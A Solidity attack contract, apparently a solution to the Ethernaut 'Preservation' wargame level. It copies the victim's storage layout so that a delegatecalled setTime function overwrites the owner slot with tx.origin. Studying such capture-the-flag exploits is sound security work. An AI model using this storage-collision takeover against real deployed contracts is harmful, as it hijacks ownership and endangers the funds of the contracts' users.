// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

contract PreservationHacker {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint256 storedTime;

  function setTime(uint256) public {
    console.log("owner: %s", owner);
    owner = tx.origin;
  }
}
